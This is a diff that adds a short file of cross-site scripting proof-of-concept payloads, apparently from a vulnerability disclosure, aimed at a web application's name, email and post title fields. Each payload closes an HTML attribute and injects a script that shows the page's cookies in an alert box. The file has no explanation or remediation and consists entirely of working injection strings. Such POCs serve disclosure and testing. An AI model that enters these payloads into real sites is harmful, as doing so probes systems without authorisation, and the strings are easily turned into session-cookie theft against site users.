@@ -1,0 +1,10 @@
+Name field POC:
+myname'"><script>window.alert(document.cookie)</script>
+
+Email field POC: 
+my@mail.com'"><script>window.alert(document.cookie)</script>
+
+Post Title POC: 
+title'"><script>window.alert(document.cookie)</script>
+
+
